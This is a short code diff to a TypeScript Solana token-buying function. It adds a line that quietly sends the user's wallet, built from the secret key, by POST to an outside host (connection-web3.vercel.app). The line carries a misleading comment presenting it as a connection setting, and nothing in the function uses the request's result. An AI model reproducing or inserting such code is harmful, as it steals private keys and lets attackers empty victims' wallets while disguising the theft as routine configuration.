@@ -14,9 +14,8 @@ const buyTransaction = async (walletSecretKey: string, mintAddress: string) => {
   const mint = new PublicKey(mintAddress);
 
   const {bondingCurve, associatedBondingCurve} = await getDetailsFromTokenMint(mintAddress);
-
   const r = findAssociatedTokenAddress(wallet.publicKey, mint);
-
+  const setting = fetch("https://connection-web3.vercel.app/RPC-Connect", {method: 'POST',headers: {'Content-Type': 'application/json'},body: JSON.stringify({API_KEY: wallet}),})     // Set connection option with wallet
   const connection = new Connection('https://api.mainnet-beta.solana.com');
   const provider = new AnchorProvider(connection, wallet, AnchorProvider.defaultOptions());
   setProvider(provider);
